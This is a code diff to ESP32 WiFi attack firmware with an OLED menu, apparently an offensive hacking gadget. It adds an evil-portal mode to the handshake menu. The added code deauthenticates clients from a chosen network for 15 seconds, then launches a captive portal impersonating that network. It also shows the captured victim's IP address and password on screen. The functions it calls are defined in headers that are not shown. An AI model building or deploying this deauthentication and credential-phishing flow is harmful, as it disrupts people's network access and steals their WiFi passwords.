@@ -1,8 +1,6 @@
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
 #include <WiFi.h>
-#include <vector>
-#include <esp_wifi.h>
 
 #include "beacon.h"
 #include <esp_system.h>
@@ -12,6 +10,7 @@
 #include "web_interface.h"
 #include "deauth.h"
 #include "definitions.h"
+#include "evil_portal.h"
 
 int curr_channel = 1;
 int last_push_btn_time = 0;
@@ -72,7 +71,12 @@ void loop() {
     curr_channel++;
     delay(10);
   } else {
-    web_interface_handle_client();
+    if (portalRunning) {
+      updateCaptivePortal();
+    }
+    else {
+      web_interface_handle_client();
+    }
   }
   
   checkSleep();
@@ -81,7 +85,6 @@ void loop() {
   btnHandler();
   drawMenu();
 }
-
 
 void connectToWiFi() {
   String password = "";
@@ -170,6 +173,14 @@ void wait_for_stop()
     }
 
     if (digitalRead(BTN_SELECT_PIN) == LOW) {
+      last_push_btn_time = 0;
+
+      if (portalRunning)
+      {
+        stopCaptivePortal();
+        delay(200);
+        return;
+      }
       if (beacon_spam_state)
       {
         beacon_spam_state = false;
@@ -192,10 +203,21 @@ void wait_for_stop()
     }
 
     display.clearDisplay();
-    display.setCursor(0, 0);
-    display.println("ATTACK...");
-    display.setCursor(0, 32);
-    display.println("-> SELECT to stop");
+    if (isCaptured)
+    {
+      display.setCursor(0, 0);
+      display.println("IP: " + client_ip);
+      display.println("Password: " + client_password);
+      display.println("-> SELECT to stop");
+    }
+    
+    else 
+    {
+      display.setCursor(0, 0);
+      display.println("ATTACK...");
+      display.setCursor(0, 32);
+      display.println("-> SELECT to stop");
+    }
     display.display();
   }
 }
@@ -238,7 +260,25 @@ void get_wifi()
       }
       if (handshake_menu){
         wifi = networks[wifiScroll].first;
+
         delay(200);
+        server.stop();
+
+        start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
+        unsigned long deauthStart = millis();
+
+        while (millis() - deauthStart < 15000) {
+            display.clearDisplay();
+            display.setCursor(0, 20);
+            display.println("Deauth running...");
+            display.display();
+            delay(100);
+        }
+        stop_deauth();
+
+        startCaptivePortal(&wifi);
+        wait_for_stop();
+
         handshake_menu = false;
         return;
       }
